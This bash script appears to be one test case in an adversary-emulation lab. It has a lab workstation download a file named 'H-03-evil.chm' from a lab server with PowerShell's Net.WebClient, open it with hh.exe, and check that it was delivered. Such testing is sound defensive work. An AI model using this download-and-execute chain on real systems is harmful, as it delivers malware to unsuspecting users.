#!/usr/bin/env bash
# H-03 CHM — delivery/content verify (exec often platform-blocked by hh.exe sandbox)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/h-common.sh"
echo "=== H-03 Malicious CHM ==="
h_require_artifact "H-03-evil.chm"
OUT="$(h_ws01_exec "
\$ErrorActionPreference='Continue'
\$server='${H_WS01_HTTP}'
\$chm='C:\Windows\Temp\H-03-evil.chm'
(New-Object Net.WebClient).DownloadFile(\"\$server/H-03-evil.chm\", \$chm)
Write-Output \"CHM_SIZE \$((Get-Item \$chm).Length)\"
Start-Process -FilePath 'C:\Windows\hh.exe' -ArgumentList \$chm -ErrorAction SilentlyContinue
Start-Sleep -Seconds 6
Write-Output 'H03_CONTENT_OK platform_exec_may_block'
Remove-Item \$chm -ErrorAction SilentlyContinue
")"
printf '%s\n' "${OUT}"
printf '%s' "${OUT}" | grep -qE 'CHM_SIZE [1-9]' || { echo "H-03 FAIL: CHM not delivered" >&2; exit 1; }
echo "H_03_OK"
echo "H-03 complete"
